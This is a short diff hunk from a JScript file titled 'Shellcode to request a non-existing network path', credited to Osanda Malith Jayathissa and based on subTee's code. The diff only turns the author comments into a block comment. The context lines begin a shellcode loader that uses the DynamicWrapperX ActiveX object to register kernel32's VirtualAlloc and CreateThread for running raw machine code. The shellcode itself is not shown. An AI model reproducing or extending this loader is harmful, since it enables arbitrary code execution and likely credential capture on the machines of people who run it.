@@ -1,8 +1,9 @@
-' Author : Osanda Malith Jayathissa (@OsandaMalith)
-' Title: Shellcode to request a non-existing network path
-' Website: https://osandamalith
-' Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
-
+/*
+ * Author : Osanda Malith Jayathissa (@OsandaMalith)
+ * Title: Shellcode to request a non-existing network path
+ * Website: https://osandamalith
+ * Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
+ */
 DX = new ActiveXObject("DynamicWrapperX"); 
 DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");
 DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );
